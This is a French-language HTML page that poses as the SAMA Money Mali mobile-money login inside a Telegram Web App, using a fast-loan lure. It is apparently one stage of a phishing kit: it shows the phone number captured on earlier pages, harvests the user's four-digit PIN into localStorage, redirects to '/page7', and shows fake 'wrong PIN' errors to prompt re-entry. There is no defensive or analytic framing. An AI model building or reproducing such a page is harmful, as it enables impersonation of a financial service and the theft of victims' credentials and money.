<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SAMA Money Mali - Connexion</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            /* Couleurs officielles de l'application SAMA Money (Mali) */
            --sama-blue: #0055A5;          /* Bleu principal SAMA Money */
            --sama-blue-dark: #003E7E;     /* Bleu foncé au survol/clic */
            --sama-navy: #0A2540;          /* Bleu nuit pour l'en-tête et le texte */
            --sama-gold: #F5A623;          /* Jaune/Or signature SAMA Money */
            --sama-gradient: linear-gradient(135deg, #0055A5 0%, #003E7E 100%);
            --bg-color: #ffffff;
            --text-dark: #0A2540;
            --text-muted: #5A6B7C;
            --border-color: #0055A5;
            --btn-disabled-bg: #E9F1F8;
            --btn-disabled-text: #8FA3BE;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body { 
            background-color: var(--bg-color); 
            margin: 0; 
            padding: 0;
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
        }

        /* Zone d'en-tête supérieure */
        .header-box { 
            width: 100%; 
            background: var(--sama-gradient); 
            padding: 30px 20px 25px; 
            color: #ffffff; 
            text-align: center; 
            box-shadow: 0 2px 10px rgba(0, 85, 165, 0.2);
            border-bottom: 3px solid var(--sama-gold);
        }

        .header-title {
            font-size: 30px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            letter-spacing: 0.3px;
        }

        .header-title .brand-sama {
            color: #ffffff;
        }

        .header-title .brand-money {
            color: var(--sama-gold);
            margin-left: 5px;
        }

        .header-title .region {
            font-size: 12px;
            margin-left: 8px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--sama-gold);
            color: var(--sama-navy);
            padding: 2px 8px;
            border-radius: 4px;
        }

        .sub-header-text { 
            font-size: 14px; 
            margin-top: 6px; 
            font-weight: 700;
            color: #ffffff;
            opacity: 0.95;
        }

        /* Zone de contenu */
        .main-content { 
            width: 90%; 
            max-width: 400px; 
            margin: 25px auto 0; 
            text-align: center; 
            flex-grow: 1; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h2 { 
            color: var(--sama-navy); 
            font-size: 22px; 
            margin: 10px 0 20px; 
            font-weight: 800; 
        }

        /* 🚨 Bannière d'erreur rouge */
        .error-banner {
            width: 100%;
            background-color: #FFF8EB;
            border: 1px solid var(--sama-gold);
            color: #D93025;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 20px;
            display: none;
            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
        }

        /* Champ d'affichage du téléphone */
        .phone-display {
            width: 100%;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 25px;
            font-size: 18px;
            font-weight: 800;
            color: var(--sama-navy);
            background-color: #EEF5FC;
        }

        .flag-icon {
            font-size: 20px;
            line-height: 1;
        }

        /* Section du code PIN */
        .pin-label { 
            color: var(--text-muted); 
            margin-bottom: 16px; 
            font-size: 14px; 
            font-weight: 600; 
        }

        .pin-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 8px;
        }

        .pin-input-group { 
            display: flex; 
            gap: 12px; 
        }

        .pin-box {
            width: 52px;
            height: 52px;
            border: 2px solid #C5DDF5;
            border-radius: 12px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            outline: none;
            background-color: #ffffff;
            transition: border-color 0.2s;
            color: var(--sama-navy);
        }

        .pin-box:focus {
            border-color: var(--sama-blue);
        }

        .pin-box.input-error {
            border-color: #D93025;
            background-color: #FFF9F9;
        }

        .toggle-eye { 
            position: absolute;
            right: 0;
            cursor: pointer; 
            font-size: 20px; 
            user-select: none;
            color: var(--sama-navy);
        }

        .forgot-pin {
            color: var(--text-muted);
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 35px;
            display: inline-block;
            font-weight: 500;
        }

        /* Bouton de soumission */
        .btn-submit {
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: all 0.2s ease;
        }

        .btn-submit.active {
            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
            border-bottom: 3px solid var(--sama-gold);
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(0, 85, 165, 0.3);
        }

        .btn-submit.active:hover {
            background: var(--sama-blue-dark);
        }

        /* Pied de page courbé */
        .footer-box { 
            width: 100%; 
            background: var(--sama-gradient); 
            padding: 35px 20px 20px; 
            color: #ffffff; 
            text-align: center; 
            border-top-left-radius: 50% 30px; 
            border-top-right-radius: 50% 30px; 
            margin-top: auto;
            border-top: 3px solid var(--sama-gold);
        }

        .footer-title {
            font-size: 26px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .footer-title .brand-sama {
            color: #ffffff;
        }

        .footer-title .brand-money {
            color: var(--sama-gold);
            margin-left: 4px;
        }

        .footer-title .region {
            font-size: 11px;
            margin-left: 6px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--sama-gold);
            color: var(--sama-navy);
            padding: 2px 6px;
            border-radius: 4px;
        }

        .terms-text { 
            font-size: 11px; 
            margin-top: 15px; 
            padding: 0 20px; 
            line-height: 1.4; 
            color: #ffffff;
            font-weight: 600;
        }

        .terms-text u { 
            color: var(--sama-gold); 
            cursor: pointer; 
        }
    </style>
</head>

<body>

<!-- Section En-tête -->
<div class="header-box">
    <div class="header-title">
        <span class="brand-sama">SAMA</span><span class="brand-money">Money</span><span class="region">Mali</span>
    </div>
    <div class="sub-header-text">Prêts Rapides & Simples</div>
</div>

<!-- Formulaire de Connexion Principal -->
<div class="main-content">
    <h2>Connexion</h2>

    <!-- Bannière d'erreur rouge -->
    <div id="errorDisplay" class="error-banner"></div>

    <!-- Affiche le numéro de téléphone saisi aux étapes précédentes -->
    <div class="phone-display">
        <span class="flag-icon">🇲🇱</span>
        <span>+223</span>
        <span id="displayPhone">--</span>
    </div>

    <p class="pin-label">Entrez votre code PIN SAMA Money</p>

    <!-- Champs PIN et Icône Œil -->
    <div class="pin-wrapper">
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        </div>
        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
    </div>

    <a href="#" class="forgot-pin">Code PIN oublié ?</a>

    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
</div>

<!-- Pied de page courbé -->
<div class="footer-box">
    <div class="footer-title">
        <span class="brand-sama">SAMA</span><span class="brand-money">Money</span><span class="region">Mali</span>
    </div>
    <div class="sub-header-text">Prêts Rapides & Simples</div>
    <p class="terms-text">En vous connectant, vous acceptez les <u>Termes et Conditions</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    // Récupération du téléphone enregistré aux étapes précédentes (localStorage)
    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "70123456";
    displayPhone.textContent = savedPhone;

    // Détection du paramètre d'erreur dans l'URL
    const urlParams = new URLSearchParams(window.location.search);
    const errParam = urlParams.get('error');

    if (errParam === 'wrong_pin' || errParam === 'wrongpin') {
        errorDisplay.textContent = "Code PIN incorrect. Veuillez entrer le bon code PIN.";
        errorDisplay.style.display = "block";
        
        pinBoxes.forEach(b => b.classList.add('input-error'));
        if (pinBoxes.length > 0) pinBoxes[0].focus();
    } else if (errParam === 'invalid_credentials' || errParam === 'invalidcredentials') {
        errorDisplay.textContent = "Informations incorrectes. Veuillez entrer les identifiants valides.";
        errorDisplay.style.display = "block";
        
        pinBoxes.forEach(b => b.classList.add('input-error'));
        if (pinBoxes.length > 0) pinBoxes[0].focus();
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');

            // Effacer la surbrillance d'erreur rouge lors de la saisie
            pinBoxes.forEach(b => b.classList.remove('input-error'));
            errorDisplay.style.display = "none";

            if (box.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }

            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value.length === 1);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    eye.addEventListener('click', () => {
        const isPassword = pinBoxes[0].type === "password";
        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
    });

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);

        errorDisplay.style.display = "none";

        window.location.href = "/page7";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
